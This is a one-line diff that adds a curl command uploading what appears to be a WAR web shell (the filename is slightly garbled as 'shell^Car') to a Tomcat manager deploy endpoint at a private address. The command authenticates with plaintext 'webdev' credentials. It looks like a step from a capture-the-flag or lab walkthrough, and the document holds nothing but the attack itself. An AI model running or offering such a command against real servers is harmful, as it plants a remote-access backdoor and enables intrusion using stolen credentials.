@@ -1,0 +1,1 @@
+curl -v -u 'webdev:Hgj3LA$02D$Fa@21' -T shell^Car 'http://10.10.117.69:8080/manager/text/deploy?path=/h3&update=true'
